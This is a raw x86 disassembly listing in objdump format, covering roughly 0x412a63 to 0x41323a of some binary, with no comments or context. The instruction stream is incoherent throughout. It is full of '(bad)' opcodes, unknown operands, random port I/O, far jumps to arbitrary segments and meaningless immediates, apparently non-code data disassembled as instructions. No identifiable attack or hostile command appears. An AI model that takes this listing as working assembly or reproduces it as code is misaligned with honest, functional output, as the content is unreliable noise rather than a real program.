  412a63:	cmp    eax,0xd4f222f8
  412a68:	push   ds
  412a69:	add    DWORD PTR [edx],edx
  412a6b:	lods   eax,DWORD PTR ds:[esi]
  412a6c:	leave  
  412a6d:	lock cwde 
  412a6f:	(bad)  
  412a70:	bound  edx,QWORD PTR [edi-0x53]
  412a73:	jle    0x412ae6
  412a75:	mov    ecx,0x56b9dd78
  412a7a:	outs   dx,DWORD PTR ss:[esi]
  412a7c:	(bad)  
  412a7d:	in     al,0x34
  412a7f:	ins    BYTE PTR es:[edi],dx
  412a80:	arpl   WORD PTR [edx+0x762a75a],ax
  412a86:	out    dx,eax
  412a87:	jns    0x412a39
  412a89:	jg     0x412a65
  412a8b:	inc    edx
  412a8c:	mov    ch,0x95
  412a8e:	inc    ebx
  412a8f:	test   eax,0xf9381c7d
  412a95:	xor    eax,ecx
  412a97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a98:	inc    ebx
  412a99:	jle    0x412a5f
  412a9b:	pop    eax
  412a9c:	(bad)  
  412a9d:	ins    DWORD PTR es:[edi],dx
  412a9e:	pop    es
  412a9f:	fwait
  412aa0:	fwait
  412aa1:	jmp    0x412a5e
  412aa3:	enter  0x6ddb,0xa3
  412aa7:	mov    dl,0xe7
  412aa9:	mov    eax,0x87ecfc5c
  412aae:	retf   
  412aaf:	xchg   ebx,eax
  412ab0:	loopne 0x412ad9
  412ab2:	ins    BYTE PTR es:[edi],dx
  412ab3:	inc    ecx
  412ab4:	cmp    DWORD PTR [eax],edi
  412ab6:	push   0x6c8348eb
  412abb:	sbb    ah,BYTE PTR [edi]
  412abd:	jmp    FWORD PTR [ebx+0x7b]
  412ac0:	ret    
  412ac1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ac2:	xlat   BYTE PTR ds:[ebx]
  412ac3:	mov    esp,0xe4ba3188
  412ac8:	fidiv  DWORD PTR [ebx-0x1a]
  412acb:	and    DWORD PTR [eax+0x56],edi
  412ace:	loop   0x412aec
  412ad0:	stc    
  412ad1:	(bad)  
  412ad2:	xchg   edx,eax
  412ad3:	int3   
  412ad4:	mov    ds:0xfd6b6ed8,eax
  412ad9:	mov    dl,0x9
  412adb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412adc:	lods   eax,DWORD PTR ds:[esi]
  412add:	sbb    al,0x11
  412adf:	pop    ebp
  412ae0:	aas    
  412ae1:	adc    al,0x7e
  412ae3:	adc    al,0x1e
  412ae5:	sbb    DWORD PTR [ecx-0x70],0x31
  412ae9:	fwait
  412aea:	pop    esp
  412aeb:	mov    WORD PTR ds:0xd6002b3c,ss
  412af1:	xlat   BYTE PTR ds:[ebx]
  412af2:	pop    es
  412af3:	mov    edx,0xd59cfbe4
  412af8:	dec    eax
  412af9:	mov    dl,0xb7
  412afb:	xlat   BYTE PTR ds:[ebx]
  412afc:	out    dx,al
  412afd:	ins    BYTE PTR es:[edi],dx
  412afe:	cmp    DWORD PTR [esp+ebx*8],ebx
  412b01:	sbb    BYTE PTR [esi+0x46c3ecb5],ch
  412b07:	jg     0x412b27
  412b09:	ins    BYTE PTR es:[edi],dx
  412b0a:	jbe    0x412b2a
  412b0c:	sbb    DWORD PTR [edi+0x158f6b0a],eax
  412b12:	(bad)  
  412b13:	fwait
  412b14:	(bad)  
  412b15:	mov    ch,0x14
  412b17:	mov    cl,0x3c
  412b19:	stos   BYTE PTR es:[edi],al
  412b1a:	jo     0x412b51
  412b1c:	mov    ecx,0x4dc55378
  412b21:	jle    0x412b6a
  412b23:	mov    ecx,0x82deb07a
  412b28:	cld    
  412b29:	mov    dl,0xe2
  412b2b:	jb     0x412b8c
  412b2d:	mov    es,edi
  412b2f:	addr16 jl 0x412abb
  412b32:	jg     0x412b1a
  412b34:	loope  0x412b9c
  412b36:	mov    eax,ds:0x24bac713
  412b3b:	leave  
  412b3c:	cmc    
  412b3d:	lahf   
  412b3e:	mov    WORD PTR [ecx+0x3d],es
  412b41:	jp     0x412b0b
  412b43:	xchg   esi,eax
  412b44:	leave  
  412b45:	stos   BYTE PTR es:[edi],al
  412b46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b47:	cmp    ah,BYTE PTR [ecx*1+0x4822fbd2]
  412b4e:	stos   DWORD PTR es:[edi],eax
  412b4f:	xchg   esp,eax
  412b50:	(bad)  
  412b51:	scas   eax,DWORD PTR es:[edi]
  412b52:	shld   DWORD PTR [ebp+0x59],eax,0xb7
  412b57:	push   es
  412b58:	dec    esp
  412b59:	test   bh,al
  412b5b:	pop    esi
  412b5c:	ret    0x343c
  412b5f:	rcr    DWORD PTR [edi-0x7ad2f975],cl
  412b65:	repz pop edx
  412b67:	(bad)  
  412b69:	(bad)  
  412b6a:	mov    ds:0xc653b189,eax
  412b6f:	xchg   BYTE PTR [edi+0x1ee0d687],al
  412b75:	ja     0x412bc2
  412b77:	adc    DWORD PTR [edi+edi*1-0x44],0xffffffbf
  412b7c:	sbb    bl,BYTE PTR [esi+0x12]
  412b7f:	fistp  WORD PTR [ebx]
  412b81:	stc    
  412b82:	(bad)  
  412b83:	xor    ebp,edi
  412b85:	loop   0x412bc5
  412b87:	mov    ds:0x1b931bf8,eax
  412b8c:	cmp    eax,0x53c767c2
  412b91:	scas   al,BYTE PTR es:[edi]
  412b92:	xor    ebx,0xc078ce12
  412b98:	cmp    al,0x37
  412b9a:	fcomp  DWORD PTR [edx+0x18]
  412b9d:	adc    eax,0x4b569f4c
  412ba2:	and    al,0x6a
  412ba4:	(bad)  
  412ba5:	jl     0x412b5f
  412ba7:	dec    ecx
  412ba8:	and    DWORD PTR [eax],esp
  412baa:	test   ecx,ebx
  412bac:	cmc    
  412bad:	dec    ebx
  412bae:	mov    WORD PTR [ebp+0x175ba82],fs
  412bb4:	push   edi
  412bb5:	jnp    0x412bd1
  412bb7:	mov    bh,BYTE PTR ds:0xf3ad98c1
  412bbd:	lock stos BYTE PTR es:[edi],al
  412bbf:	test   al,0xc7
  412bc1:	stos   DWORD PTR es:[edi],eax
  412bc2:	adc    ecx,DWORD PTR [ebx-0x37]
  412bc5:	dec    ebx
  412bc6:	out    0x7c,al
  412bc8:	inc    edx
  412bc9:	cmp    bh,ah
  412bcb:	jb     0x412c1f
  412bcd:	inc    eax
  412bce:	(bad)  
  412bcf:	fnstcw WORD PTR [esi+ebx*8]
  412bd2:	in     eax,dx
  412bd3:	or     DWORD PTR [edi-0x3ff6fb9b],esi
  412bd9:	in     eax,0x81
  412bdb:	xchg   ebp,eax
  412bdc:	ret    
  412bdd:	adc    DWORD PTR [ebx],ebp
  412bdf:	lds    esi,FWORD PTR [ebx-0x3f3c64c1]
  412be5:	les    eax,FWORD PTR [esi]
  412be7:	pop    esi
  412be8:	mov    esi,0xeb054bd0
  412bed:	fcomp  QWORD PTR [esi+0x5031c25c]
  412bf3:	dec    ecx
  412bf4:	cmp    ebx,ecx
  412bf6:	neg    BYTE PTR [ebx-0x5c]
  412bf9:	xchg   dh,dl
  412bfb:	xlat   BYTE PTR ds:[ebx]
  412bfc:	lods   eax,DWORD PTR ds:[esi]
  412bfd:	mov    ecx,0xdec15e9a
  412c02:	mov    ebp,0x562dab90
  412c07:	xor    al,0xb7
  412c09:	lods   al,BYTE PTR ds:[esi]
  412c0a:	xchg   esi,eax
  412c0b:	xchg   esi,eax
  412c0c:	fisubr DWORD PTR [edx-0xe42a25e]
  412c12:	and    eax,0x6025a021
  412c17:	sbb    al,0x50
  412c19:	sbb    bl,ah
  412c1b:	inc    edx
  412c1c:	in     al,0x52
  412c1e:	fs pop esp
  412c20:	mov    ch,0xe2
  412c22:	xchg   ebx,eax
  412c23:	aam    0x31
  412c25:	mov    ebx,0xfae407f2
  412c2a:	push   ecx
  412c2b:	pop    eax
  412c2c:	sub    BYTE PTR [edi+0x8],cl
  412c2f:	shl    BYTE PTR [esi-0x2f],0xb3
  412c33:	xor    al,0xac
  412c35:	xchg   ah,bl
  412c37:	inc    esi
  412c38:	leave  
  412c39:	jmp    0x6d1a195c
  412c3e:	imul   eax,eax,0x8b5b1348
  412c44:	xchg   esi,eax
  412c45:	into   
  412c46:	push   eax
  412c47:	inc    eax
  412c48:	loopne 0x412c9a
  412c4a:	mov    ah,0x8f
  412c4c:	aam    0x38
  412c4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c50:	data16 and BYTE PTR [eax],ah
  412c53:	mov    ecx,0x215bb904
  412c58:	fdiv   DWORD PTR [eax+0x73]
  412c5b:	mov    ecx,0xa26e4ac2
  412c60:	mov    ebp,0xecafc307
  412c65:	push   eax
  412c66:	lods   eax,DWORD PTR ds:[esi]
  412c67:	fst    DWORD PTR [ecx]
  412c69:	xchg   edi,eax
  412c6a:	ins    DWORD PTR es:[edi],dx
  412c6b:	jbe    0x412c1b
  412c6d:	scas   eax,DWORD PTR es:[edi]
  412c6e:	dec    ebx
  412c6f:	inc    ecx
  412c70:	mov    eax,0xb3fc2ce4
  412c75:	mov    eax,ds:0xb5ccf602
  412c7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c7b:	xor    DWORD PTR [ebp+eiz*2+0x67c68c89],ebx
  412c82:	fwait
  412c83:	mov    ebx,0x499fc779
  412c88:	mov    ch,0x76
  412c8a:	call   0xaed62ffe
  412c8f:	(bad)  
  412c90:	hlt    
  412c91:	pop    ecx
  412c92:	mov    WORD PTR [edx],?
  412c94:	adc    bh,BYTE PTR [ebx+0x78]
  412c97:	inc    esi
  412c98:	inc    esi
  412c99:	into   
  412c9a:	and    eax,0xcafeb1fd
  412c9f:	or     BYTE PTR [esi-0x63],bh
  412ca2:	enter  0xd5c6,0x75
  412ca6:	cmp    DWORD PTR [ebx],edx
  412ca8:	out    dx,eax
  412ca9:	jmp    0xafe2:0x1c37333a
  412cb0:	xchg   ecx,eax
  412cb1:	sbb    dl,BYTE PTR [ebx-0x6079b815]
  412cb7:	jg     0x412d25
  412cb9:	xchg   esi,eax
  412cba:	mov    ebp,0x226c92a0
  412cbf:	dec    esp
  412cc0:	push   cs
  412cc1:	push   eax
  412cc2:	out    dx,al
  412cc3:	adc    DWORD PTR [esi-0x59],eax
  412cc6:	mov    bl,0x50
  412cc8:	cmp    cl,BYTE PTR ss:[ebx-0x1260dcef]
  412ccf:	ds push ss
  412cd1:	hlt    
  412cd2:	sub    dh,BYTE PTR [eax-0x2355707e]
  412cd8:	mov    edx,0x9657e5bf
  412cdd:	je     0x412d24
  412cdf:	mov    edx,0xc95f2503
  412ce4:	repnz call 0xc575:0xb0298229
  412cec:	div    esi
  412cee:	iret   
  412cef:	aam    0x99
  412cf1:	sbb    eax,0xe75020c
  412cf6:	sahf   
  412cf7:	(bad)  
  412cf9:	(bad)  
  412cfa:	(bad)  
  412cfb:	mov    ebp,0xe9926b59
  412d00:	nop
  412d01:	add    edx,ecx
  412d03:	xchg   ebp,eax
  412d04:	sbb    DWORD PTR [ebx-0x13],0xffffffc6
  412d08:	int    0x84
  412d0a:	jns    0x412d13
  412d0c:	jmp    0x75d0:0x87ca37f8
  412d13:	jmp    0x2d23:0xa8dfccc6
  412d1a:	cmp    DWORD PTR [edx+0xb8107b7],esi
  412d20:	inc    ebp
  412d21:	push   esi
  412d22:	xchg   ecx,eax
  412d23:	dec    ebp
  412d24:	xor    ebx,edi
  412d26:	js     0x412d47
  412d28:	sub    al,0x16
  412d2a:	xchg   edx,eax
  412d2b:	pop    ebx
  412d2c:	inc    ecx
  412d2d:	fwait
  412d2e:	adc    DWORD PTR [eax-0x746cd813],edi
  412d34:	bound  edx,QWORD PTR [ecx+eax*2-0x10b08a23]
  412d3b:	(bad)  
  412d3c:	pop    ebx
  412d3d:	xor    bl,dh
  412d3f:	sbb    al,0xd0
  412d41:	stos   DWORD PTR es:[edi],eax
  412d42:	jge    0x412ceb
  412d44:	stos   DWORD PTR es:[edi],eax
  412d45:	sub    ebx,0x53
  412d48:	cmp    ah,BYTE PTR fs:[ecx+0x938a389]
  412d4f:	ins    BYTE PTR es:[edi],dx
  412d50:	push   ebp
  412d51:	or     esp,DWORD PTR [ecx+0xca0df4e]
  412d57:	mov    ebx,0x1d829f5a
  412d5c:	adc    al,0x27
  412d5e:	jmp    0x7da1:0x72094697
  412d65:	mov    ah,0x6
  412d67:	xchg   ebp,eax
  412d68:	sub    ecx,DWORD PTR [edi+0x55ef72c1]
  412d6e:	not    BYTE PTR [edx-0x4c59cd0e]
  412d74:	xchg   BYTE PTR [ecx+0x53049d41],dl
  412d7a:	dec    ecx
  412d7b:	mov    esp,0x3b6055d0
  412d80:	inc    esi
  412d81:	mov    al,ds:0x90d45652
  412d86:	xchg   ecx,eax
  412d87:	and    al,0x27
  412d89:	jmp    0x412d1c
  412d8b:	pcmpgtb mm5,mm1
  412d8e:	lods   eax,DWORD PTR ds:[esi]
  412d8f:	lea    esp,[edx-0x7c]
  412d92:	dec    esi
  412d93:	mov    esi,0x32672951
  412d98:	out    dx,al
  412d99:	or     eax,0xf418fb83
  412d9e:	in     eax,dx
  412d9f:	xchg   BYTE PTR [ebx+0x51c4765],al
  412da5:	and    eax,0x23895d23
  412daa:	daa    
  412dab:	outs   dx,BYTE PTR fs:[esi]
  412dad:	push   esi
  412dae:	mov    ah,0x40
  412db0:	data16 test al,0xe4
  412db3:	pushf  
  412db4:	fidiv  WORD PTR [ecx+eiz*4]
  412db7:	and    ch,al
  412db9:	jp     0x412db1
  412dbb:	mov    cl,0xf8
  412dbd:	(bad)  
  412dbe:	and    al,0x57
  412dc0:	neg    BYTE PTR [edi+0x6624a9b7]
  412dc6:	push   0xffffffe4
  412dc8:	or     eax,0x86272a38
  412dcd:	sbb    al,0xb2
  412dcf:	mov    ch,0x42
  412dd1:	or     BYTE PTR [eax-0x28],dl
  412dd4:	inc    edx
  412dd5:	cmp    DWORD PTR [ebx],esp
  412dd7:	xor    BYTE PTR [eax-0x1f],ah
  412dda:	js     0x412d5e
  412ddc:	sbb    ebp,DWORD PTR [ebx-0x6f]
  412ddf:	inc    edi
  412de0:	jmp    0x20f4:0xcce4535d
  412de7:	jb     0x412dda
  412de9:	fdiv   DWORD PTR [edx+0x78d5939e]
  412def:	test   DWORD PTR [edx+0x48],esi
  412df2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412df3:	adc    ah,al
  412df5:	mov    al,ds:0xb6705a42
  412dfa:	push   0xffffffc4
  412dfc:	sub    DWORD PTR [ebp+edi*1-0x80],ecx
  412e00:	cmp    eax,0x436bed0d
  412e05:	mov    ah,0xc
  412e07:	adc    DWORD PTR [eax],0xffffff9b
  412e0a:	sub    ebx,DWORD PTR [edi-0x5c1e237]
  412e10:	test   DWORD PTR [esi-0x74],ebx
  412e13:	mov    bl,0x6f
  412e15:	mov    ebp,0x21cf7c47
  412e1a:	mov    dl,0x36
  412e1c:	retf   
  412e1d:	ds fstp st(6)
  412e20:	neg    BYTE PTR [eax]
  412e22:	outs   dx,BYTE PTR ds:[esi]
  412e23:	sub    al,0xdd
  412e25:	xchg   edx,eax
  412e26:	mov    ?,WORD PTR [esi-0x59656e76]
  412e2c:	push   esp
  412e2d:	inc    esp
  412e2e:	jge    0x412e52
  412e30:	dec    esi
  412e31:	stos   DWORD PTR es:[edi],eax
  412e32:	push   edi
  412e33:	mov    WORD PTR [ebx-0x58],ss
  412e36:	scas   eax,DWORD PTR es:[edi]
  412e37:	mov    edi,0x702a78fe
  412e3c:	mov    fs,WORD PTR [ecx-0x56b552de]
  412e42:	xchg   ebp,eax
  412e43:	(bad)  
  412e44:	call   0x5433:0xa2f0fbea
  412e4b:	je     0x412e2e
  412e4d:	pusha  
  412e4e:	fsubr  QWORD PTR [esi-0x3914051a]
  412e54:	or     eax,0x3ff1ecc7
  412e59:	dec    edx
  412e5a:	adc    BYTE PTR [edi+0x66],cl
  412e5d:	add    ah,ah
  412e5f:	loope  0x412ed2
  412e61:	mov    BYTE PTR [edi-0x61],ch
  412e64:	sub    BYTE PTR ds:[ebp-0x6a],ah
  412e68:	rol    DWORD PTR [ecx+0x15],0xd1
  412e6c:	adc    DWORD PTR [ebx],esi
  412e6e:	imul   edx,DWORD PTR [ebx+0x5abee071],0xffffff8e
  412e75:	dec    ebp
  412e76:	cdq    
  412e77:	call   0xa53a2c9e
  412e7c:	call   0xfd491b07
  412e81:	ins    BYTE PTR es:[edi],dx
  412e82:	sbb    bh,ah
  412e84:	cmp    eax,0x5a8d1d7f
  412e89:	jbe    0x412e94
  412e8b:	sbb    BYTE PTR [edx],bl
  412e8d:	rol    DWORD PTR [eax+0x43dc3fb8],cl
  412e93:	pop    es
  412e94:	pop    esp
  412e95:	sub    DWORD PTR [esi-0x3f],esi
  412e98:	in     eax,0x80
  412e9a:	int    0x5e
  412e9c:	dec    ebp
  412e9d:	imul   edi,eax,0xfffffff2
  412ea0:	fmul   st(2),st
  412ea2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ea3:	mov    bl,0x9d
  412ea5:	ins    DWORD PTR es:[edi],dx
  412ea6:	arpl   WORD PTR [edi],dx
  412ea8:	ja     0x412eb4
  412eaa:	loop   0x412eb5
  412eac:	and    al,0xa3
  412eae:	xchg   esp,eax
  412eaf:	push   esi
  412eb0:	push   es
  412eb1:	pop    es
  412eb2:	stc    
  412eb3:	jle    0x412e5e
  412eb5:	cmc    
  412eb6:	cli    
  412eb7:	xor    DWORD PTR [edi+0x47923459],0x4c
  412ebe:	inc    ebx
  412ebf:	lods   eax,DWORD PTR ds:[esi]
  412ec0:	mov    edi,0xeede5fe8
  412ec5:	dec    edx
  412ec6:	in     eax,dx
  412ec7:	fistp  DWORD PTR [esi+0x79d4d71]
  412ecd:	add    DWORD PTR [ebx],0x24bd4ca
  412ed3:	in     eax,0x21
  412ed5:	imul   ebp,DWORD PTR ds:0x181b41be,0x41
  412edc:	dec    ebp
  412edd:	sub    ebx,DWORD PTR [edi-0x3e]
  412ee0:	xchg   edx,eax
  412ee1:	xor    bl,0xbb
  412ee4:	mov    edi,0xa2181eb2
  412ee9:	jecxz  0x412efc
  412eeb:	pop    ds
  412eec:	pop    eax
  412eed:	push   esp
  412eee:	(bad)
  412ef1:	arpl   WORD PTR [ebp-0x74091767],sp
  412ef7:	in     al,dx
  412ef8:	or     BYTE PTR [ecx+0x7b9016bc],0x6d
  412eff:	stc    
  412f00:	xchg   ebx,eax
  412f01:	ins    BYTE PTR es:[edi],dx
  412f02:	or     al,dh
  412f04:	enter  0xe54a,0xd9
  412f08:	mov    ah,0x37
  412f0a:	rcl    BYTE PTR [ecx-0x1e],cl
  412f0d:	jl     0x412f32
  412f0f:	dec    ebp
  412f10:	jns    0x412f75
  412f12:	shl    BYTE PTR [esp+ebx*4],cl
  412f15:	push   ecx
  412f16:	dec    edx
  412f17:	sub    ebx,DWORD PTR [ecx+0x5c]
  412f1a:	and    eax,0x99ff3ed3
  412f1f:	pop    ecx
  412f20:	jl     0x412f86
  412f22:	mov    dl,0xed
  412f24:	dec    edx
  412f25:	and    DWORD PTR [edx+ecx*4],ebx
  412f28:	sbb    BYTE PTR [ecx],dl
  412f2a:	ror    BYTE PTR [ebx+0x1f8d8e55],cl
  412f30:	gs inc ebx
  412f32:	std    
  412f33:	or     DWORD PTR ds:0xb4f922af,esp
  412f39:	pushf  
  412f3a:	outs   dx,DWORD PTR ds:[esi]
  412f3b:	cmovle ebx,DWORD PTR [esp+eiz*8+0x4a92a430]
  412f43:	aam    0x45
  412f45:	and    BYTE PTR ds:0x10a72b6a,cl
  412f4b:	test   al,0x90
  412f4d:	or     ebp,DWORD PTR [eax-0x163cbde9]
  412f53:	mov    eax,ds:0xbfdf92d8
  412f58:	(bad)  
  412f5a:	sub    al,0x4a
  412f5c:	in     al,dx
  412f5d:	sahf   
  412f5e:	jmp    0x412ee3
  412f60:	lods   eax,DWORD PTR ds:[esi]
  412f61:	int    0xcf
  412f63:	mov    ?,WORD PTR [ebx]
  412f65:	sahf   
  412f66:	int3   
  412f67:	push   esi
  412f68:	mov    ah,0x65
  412f6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f6b:	jmp    0x412f2e
  412f6d:	cli    
  412f6e:	rol    bh,1
  412f70:	mov    esi,0xc983daf0
  412f75:	lods   al,BYTE PTR ds:[esi]
  412f76:	cmp    eax,0x1e717694
  412f7b:	mov    ds:0xded608d7,eax
  412f80:	out    dx,al
  412f81:	jmp    DWORD PTR [ebp-0x7c]
  412f84:	inc    ebx
  412f85:	fadd   QWORD PTR [esi]
  412f87:	mov    ebp,0x2399c9ac
  412f8c:	je     0x412fe1
  412f8e:	test   ch,bl
  412f90:	clc    
  412f91:	xchg   ecx,eax
  412f92:	gs in  eax,0x42
  412f95:	(bad)  
  412f96:	cmp    eax,0xa2d7c39b
  412f9b:	sbb    cl,dl
  412f9d:	retf   0x20e3
  412fa0:	out    0x39,eax
  412fa2:	and    BYTE PTR [ebx],bl
  412fa4:	mov    dh,ch
  412fa6:	fcomp  QWORD PTR [edx+0x69]
  412fa9:	mov    ch,bh
  412fab:	xor    eax,0xb56824b1
  412fb0:	xchg   ecx,eax
  412fb1:	loop   0x412fe4
  412fb3:	or     BYTE PTR [eax-0x50bd3517],cl
  412fb9:	add    edi,edi
  412fbb:	jp     0x412fdd
  412fbd:	call   0xa6d0a75e
  412fc2:	std    
  412fc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fc4:	lods   al,BYTE PTR ds:[esi]
  412fc5:	jmp    0x5d87d773
  412fca:	in     al,0x34
  412fcc:	cmp    edx,DWORD PTR ds:0x2d86997d
  412fd2:	jns    0x413022
  412fd4:	and    al,ah
  412fd6:	sbb    BYTE PTR [ebx-0x3bd257f7],dl
  412fdc:	adc    DWORD PTR [ebx+0x2a],0x933b6da3
  412fe3:	je     0x413064
  412fe5:	fmul   st,st(5)
  412fe7:	test   DWORD PTR [eax+0x79],ebx
  412fea:	test   eax,0xa566753a
  412fef:	(bad)  
  412ff0:	inc    ebp
  412ff1:	std    
  412ff2:	aad    0x3b
  412ff4:	adc    edi,DWORD PTR [edx-0x31260132]
  412ffa:	mov    ah,0xf3
  412ffc:	mov    ds:0xed63140c,eax
  413001:	retf   
  413002:	imul   ecx,DWORD PTR [ebx],0x4f
  413005:	aad    0xd3
  413007:	test   DWORD PTR [eax+0x44e8759d],0xbbee863f
  413011:	add    eax,0x65cd6f80
  413016:	lea    bp,[esi+0x435d400b]
  41301d:	ja     0x413012
  41301f:	scas   al,BYTE PTR es:[edi]
  413020:	aad    0xfb
  413022:	or     DWORD PTR [ebp-0x74672308],eax
  413028:	and    DWORD PTR [edx],ecx
  41302a:	sub    eax,0x36343e02
  41302f:	test   DWORD PTR [esi],eax
  413031:	es (bad) 
  413033:	imul   ah
  413035:	inc    BYTE PTR [ebp+0x60]
  413038:	shld   DWORD PTR [ebx+0x75961b99],esp,0xcb
  413040:	add    al,0x27
  413042:	leave  
  413043:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413044:	inc    esp
  413045:	retf   0xe47f
  413048:	push   esp
  413049:	and    eax,0xeef2509a
  41304e:	xchg   ebp,eax
  41304f:	cmp    DWORD PTR [esi+0x1f186178],esi
  413055:	inc    ecx
  413056:	inc    ecx
  413057:	call   0xb552:0xe5d95d00
  41305e:	xor    eax,0x9a92ee5a
  413063:	pop    ebp
  413064:	mov    bh,0xbb
  413066:	(bad)  
  413067:	imul   ebp,DWORD PTR [ebp+0x7f],0xffffffc5
  41306b:	cmp    al,0x43
  41306d:	and    bl,BYTE PTR [edx]
  41306f:	test   DWORD PTR [edi+0x7c1dccd0],ecx
  413075:	add    DWORD PTR [esi+0x48],esi
  413078:	push   eax
  413079:	imul   eax,edx,0x618ed1a4
  41307f:	jle    0x413007
  413081:	(bad)
  413084:	sub    dl,BYTE PTR [ecx-0x2c6d15bc]
  41308a:	and    DWORD PTR [edi-0xd83c36b],edi
  413090:	out    0xfd,eax
  413092:	addr16 cmp al,0x5c
  413095:	lods   eax,DWORD PTR ds:[esi]
  413096:	std    
  413097:	sub    ebp,DWORD PTR [edi]
  413099:	imul   esp,eax,0x13
  41309c:	ficom  DWORD PTR [ebp-0x68]
  41309f:	jle    0x413117
  4130a1:	arpl   WORD PTR [ebp*4+0x23c458a1],bx
  4130a8:	push   esi
  4130a9:	cmp    dh,BYTE PTR [edi]
  4130ab:	push   ds
  4130ac:	jl     0x41302f
  4130ae:	push   ecx
  4130af:	mov    edx,0x3d29868d
  4130b4:	test   dh,dh
  4130b6:	mov    esp,0xb89d2354
  4130bb:	cdq    
  4130bc:	jo     0x41305c
  4130be:	push   esp
  4130bf:	jmp    0xac2ce64b
  4130c4:	mul    DWORD PTR [edx+0x12c002b6]
  4130ca:	push   cs
  4130cb:	add    DWORD PTR [edx],0x6fccad10
  4130d1:	arpl   ax,sp
  4130d3:	ret    0x71f7
  4130d6:	gs mov edx,ss
  4130d9:	mov    BYTE PTR [ebx+eiz*2-0x18],ch
  4130dd:	in     eax,dx
  4130de:	retf   0xccde
  4130e1:	test   BYTE PTR ds:0xfd54d478,ah
  4130e7:	add    eax,0xdb962d86
  4130ec:	mov    ah,0x80
  4130ee:	add    DWORD PTR [eax+0x2],ecx
  4130f1:	sub    DWORD PTR [ebp+0x496a046d],eax
  4130f7:	mov    edx,0x49b84bc2
  4130fc:	out    0x98,al
  4130fe:	mov    ebx,0x3becfb5a
  413103:	mov    dl,0x94
  413105:	stc    
  413106:	cld    
  413107:	lods   eax,DWORD PTR ds:[esi]
  413108:	scas   eax,DWORD PTR es:[edi]
  413109:	ds popa 
  41310b:	jbe    0x41317f
  41310d:	push   ss
  41310e:	push   ss
  41310f:	std    
  413110:	ins    DWORD PTR es:[edi],dx
  413111:	or     ecx,DWORD PTR [edi+0xd9426b]
  413117:	repz mov cl,0x4c
  41311a:	jmp    0x382f:0x9abe20d6
  413121:	sub    BYTE PTR [eax+0x47c8dba6],bh
  413127:	popa   
  413128:	ss int 0xa1
  41312b:	hlt    
  41312c:	adc    BYTE PTR [eax],bh
  41312e:	call   0x9145c0d7
  413133:	mov    al,0x30
  413135:	add    eax,0x8346c631
  41313a:	mov    bh,BYTE PTR [ebp-0x462ef393]
  413140:	js     0x413126
  413142:	fs push es
  413144:	popa   
  413145:	enter  0xe944,0x43
  413149:	nop
  41314a:	push   edi
  41314b:	arpl   ax,sp
  41314d:	stos   DWORD PTR es:[edi],eax
  41314e:	hlt    
  41314f:	scas   al,BYTE PTR es:[edi]
  413150:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413151:	fstp   QWORD PTR [esi]
  413153:	adc    ecx,DWORD PTR [edi-0x2c]
  413156:	pop    edi
  413157:	pusha  
  413158:	mov    al,ds:0xda6c2249
  41315d:	lds    ebx,FWORD PTR [edi+edi*8]
  413160:	jbe    0x4131d4
  413162:	xor    al,0x9e
  413164:	sub    BYTE PTR [ebp-0x2a43d2e5],0x93
  41316b:	sahf   
  41316c:	push   0xffffffda
  41316e:	jne    0x413147
  413170:	add    al,BYTE PTR [edx+0x79]
  413173:	mov    dh,BYTE PTR [eax+0x5f]
  413176:	pop    edx
  413177:	pop    es
  413178:	xchg   edx,eax
  413179:	repnz xchg ebp,eax
  41317b:	inc    esp
  41317c:	lods   eax,DWORD PTR ds:[esi]
  41317d:	xor    dl,bh
  41317f:	hlt    
  413180:	retf   
  413181:	mov    esp,0x4a482af0
  413186:	js     0x413141
  413188:	pop    esp
  413189:	cli    
  41318a:	sti    
  41318b:	ret    
  41318c:	sbb    eax,esi
  41318e:	fstp   QWORD PTR [ecx-0x36106d76]
  413194:	jmp    0x41312b
  413196:	add    eax,0x96f487ab
  41319b:	jg     0x41314f
  41319d:	sub    eax,0x560530ec
  4131a2:	jae    0x4131d4
  4131a4:	mul    DWORD PTR [ecx]
  4131a6:	xor    dh,al
  4131a8:	jmp    0x82d674c8
  4131ad:	fstp   DWORD PTR [esi-0x122c17c4]
  4131b3:	nop
  4131b4:	sub    dl,BYTE PTR [esp+ebx*4+0x280fa00]
  4131bb:	sti    
  4131bc:	xor    al,0x51
  4131be:	idiv   BYTE PTR [ecx+0x19afbd74]
  4131c4:	pop    es
  4131c5:	and    bh,cl
  4131c7:	mov    ds:0x34db1993,al
  4131cc:	xchg   ebx,eax
  4131cd:	int3   
  4131ce:	mov    ds:0xae63adc6,eax
  4131d3:	les    edi,FWORD PTR [edx]
  4131d5:	shl    BYTE PTR [esi-0x6291ee5d],1
  4131db:	adc    BYTE PTR [ebp+0x3e4676f7],cl
  4131e1:	fmul   DWORD PTR [edx]
  4131e3:	pop    esp
  4131e4:	bound  eax,QWORD PTR [edx-0x6651140c]
  4131ea:	mov    eax,DWORD PTR [esi+0x48fea49e]
  4131f0:	jno    0x4131ff
  4131f2:	imul   esi,DWORD PTR [edx],0xffffffde
  4131f5:	int    0xa1
  4131f7:	mov    ebp,0x22e132c9
  4131fc:	inc    esi
  4131fd:	out    0x8c,eax
  4131ff:	in     eax,dx
  413200:	std    
  413201:	mov    dh,0xb9
  413203:	mov    edi,0x93c20ea3
  413208:	pop    edx
  413209:	jmp    0x3a317106
  41320e:	rcl    DWORD PTR [ebx],0xe5
  413211:	push   ebp
  413212:	sbb    BYTE PTR [ecx-0x27],dl
  413215:	jnp    0x413266
  413217:	pop    edi
  413218:	jecxz  0x413292
  41321a:	pinsrw mm3,WORD PTR [esp-0x5f665754],0x91
  413223:	or     ch,dl
  413225:	scas   al,BYTE PTR es:[edi]
  413226:	mov    ebx,0x2cd55b16
  41322b:	mov    eax,0x4bb89eff
  413230:	xchg   edi,eax
  413231:	inc    esi
  413232:	xor    eax,0x64007ec8
  413237:	or     ah,0xb4
  41323a:	loope  0x4131ce
